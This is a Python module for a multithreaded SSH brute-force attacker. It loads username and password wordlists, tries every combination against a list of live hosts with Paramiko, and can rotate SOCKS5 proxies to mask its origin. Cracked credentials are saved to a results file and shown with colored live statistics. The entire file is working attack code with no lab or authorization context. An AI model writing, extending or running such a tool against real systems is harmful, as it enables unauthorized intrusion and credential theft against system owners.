from globals import (
    global_live_hosts, global_tested_proxies, global_config,
    pause_event, stop_event, brute_stats
)
import os
import time
import threading
import socks
import socket
from itertools import cycle
from tqdm import tqdm
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko
from collections import deque

# Ensure results directory exists
os.makedirs("results", exist_ok=True)

# Thread-safe lock for updating shared stats
lock = threading.Lock()

# Limit for displaying recent attempts
PRINT_LIMIT = 20
recent_attempts = deque(maxlen=PRINT_LIMIT)


def load_wordlists():
    """Load usernames and passwords from the wordlists directory."""
    wordlist_dir = "wordlists"
    username_file = os.path.join(wordlist_dir, "ssh_usernames.txt")
    password_file = os.path.join(wordlist_dir, "ssh_passwords.txt")

    usernames, passwords = [], []

    try:
        if not os.path.exists(username_file):
            raise FileNotFoundError(f"[ERROR] Username wordlist not found: {username_file}")

        if not os.path.exists(password_file):
            raise FileNotFoundError(f"[ERROR] Password wordlist not found: {password_file}")

        with open(username_file, "r") as uf:
            usernames = [line.strip() for line in uf if line.strip()]

        with open(password_file, "r") as pf:
            passwords = [line.strip() for line in pf if line.strip()]

    except Exception as e:
        print(f"[ERROR] Failed to load wordlists: {e}")

    print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    return usernames, passwords


def attempt_login(host, username, password, proxy=None):
    """Attempt SSH login for a single target using Paramiko."""
    global brute_stats

    while pause_event.is_set():
        time.sleep(0.5)

    if stop_event.is_set():
        print("[INFO] Stopping brute force attack.")
        return False

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Apply proxy settings if enabled
        if proxy:
            proxy_host, proxy_port = proxy.split(":")
            socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
            socket.socket = socks.socksocket

        # Connect using username/password
        client.connect(host, username=username, password=password, timeout=global_config.get("scan_timeout", 5))

        with lock:
            brute_stats["success"] += 1
            brute_stats["remaining"] -= 1
            recent_attempts.append([host, username, password, "Success"])

        print_status()
        print(colored(f"[SUCCESS] {host} - {username}:{password}", "green"))

        with open("results/cracked.txt", "a") as file:
            file.write(f"{host} {username}:{password}\n")

        client.close()
        return True

    except paramiko.AuthenticationException:
        with lock:
            brute_stats["failed"] += 1
            brute_stats["remaining"] -= 1
            recent_attempts.append([host, username, password, "Failed"])

        print_status()
        return False

    except Exception as e:
        print(colored(f"[ERROR] {host} - {username}:{password}: {e}", "red"))
        return False


def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
    """Perform SSH brute force attack using Paramiko."""
    if not targets:
        print("[ERROR] No live hosts available for brute force.")
        return

    if not usernames or not passwords:
        print("[ERROR] No wordlists loaded.")
        return

    global brute_stats
    with lock:
        brute_stats.update({
            "running": True,
            "total_attempts": len(targets) * len(usernames) * len(passwords),
            "success": 0,
            "failed": 0,
            "remaining": len(targets) * len(usernames) * len(passwords)
        })

    print("[INFO] Starting brute force attack...")

    def background_bruteforce():
        with ThreadPoolExecutor(max_threads) as executor:
            proxy_cycle = cycle(global_tested_proxies) if global_config.get("proxy_usage", False) else None
            futures = []

            for target in targets:
                proxy = next(proxy_cycle) if proxy_cycle else None
                for username in usernames:
                    for password in passwords:
                        futures.append(
                            executor.submit(attempt_login, target, username, password, proxy)
                        )

            for future in tqdm(as_completed(futures), desc="Bruteforcing SSH", total=len(futures)):
                future.result()

        with lock:
            brute_stats["running"] = False

        print(f"[INFO] Brute force complete. Results saved to results/cracked.txt.")

    # Start brute forcing in the background
    brute_thread = threading.Thread(target=background_bruteforce, daemon=True)
    brute_thread.start()


def print_status():
    """Update the terminal display dynamically with counters."""
    with lock:
        success_text = colored(f"Successful: {brute_stats['success']}", "green")
        failed_text = colored(f"Failed: {brute_stats['failed']}", "red")
        remaining_text = colored(f"Remaining: {brute_stats['remaining']}", "yellow")
        total_attempts_text = colored(f"Total Attempts: {brute_stats['total_attempts']}", "white")

    print(f"\r{success_text} | {failed_text} | {remaining_text} | {total_attempts_text}", end="")

    # Display recent brute-force attempts
    print("\nMost recent brute force attempts:")
    for attempt in reversed(recent_attempts):
        host, username, password, status = attempt
        color = "green" if status == "Success" else "red"
        print(colored(f"{host} - {username}:{password} - {status}", color))


def clear_screen():
    """Cross-platform clear screen."""
    os.system("cls" if os.name == "nt" else "clear")


def display_statistics():
    """Show brute-force statistics dynamically with color enhancements."""
    clear_screen()
    print("\n" + colored("[ BRUTE FORCE STATISTICS ]", "cyan", attrs=["bold"]))

    print(f"🔑 {colored('Brute-force:', 'cyan', attrs=['bold'])} "
          f"{colored(brute_stats.get('running', 0), 'white')} Running | "
          f"{colored(brute_stats.get('success', 0), 'green')} Success | "
          f"{colored(brute_stats.get('failed', 0), 'red')} Failed | "
          f"{colored(brute_stats.get('remaining', 0), 'yellow')} Remaining\n")


